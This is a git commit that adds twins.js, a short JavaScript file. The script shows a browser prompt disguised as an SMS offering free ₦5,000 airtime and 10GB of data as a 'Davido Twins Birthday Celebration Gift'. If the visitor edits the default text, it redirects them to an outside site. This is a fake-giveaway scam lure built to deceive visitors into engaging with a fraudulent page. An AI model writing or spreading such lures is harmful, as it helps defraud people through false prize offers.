35c79ebe81fe7fc3e8c0a8f4d273e9353cdd123b
boss-bloq <nsisboy01@gmail.com>
2024-09-24 01:52:24 -0700

    Create twins.js

---
+++ twins.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 10GB + ₦5,000 '
+password=prompt('SMS: Hello, You are invited to activate ₦5,000 Airtime and 10GB Free Data Davido Twins Birthday Celebration Gift. Press Ok to Activate now ','ACTIVATE 10GB + ₦5,000');
+if (password != 'ACTIVATE 10GB + ₦5,000') {
+location.href='https://damba-fest.org/davido-twins.html';
+}
